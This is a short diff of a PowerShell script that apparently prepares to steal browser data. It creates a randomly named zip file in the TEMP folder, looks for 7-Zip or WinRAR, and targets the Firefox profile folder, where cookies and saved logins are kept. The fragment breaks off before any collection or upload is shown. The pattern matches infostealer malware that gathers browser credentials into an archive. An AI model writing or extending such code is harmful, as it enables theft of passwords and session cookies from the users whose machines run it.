@@ -2,10 +2,10 @@ echo "qwe"
 $e=""
 $p=$env:TEMP+"\d"+(Get-Random -max 17071707)+".zip"
 
-if(Test-Path -Path "C:\Program Files\WinRAR222\WinRAR.exe")
-  {$arh="WinRar"}
-elseif(Test-Path -Path "C:\Program Files\7-Zip\7z.exe")
+if(Test-Path -Path "C:\Program Files\7-Zip\7z.exe")
   {Set-Location -Path "C:\Program Files\7-Zip\";$arh="7-Zip"}
+elseif(Test-Path -Path "C:\Program Files\WinRAR\WinRAR.exe")
+  {$arh="WinRar"}
 
 $f=($env:APPDATA+"\Mozilla\Firefox\Profiles\*");
 if(Test-Path -Path $f)
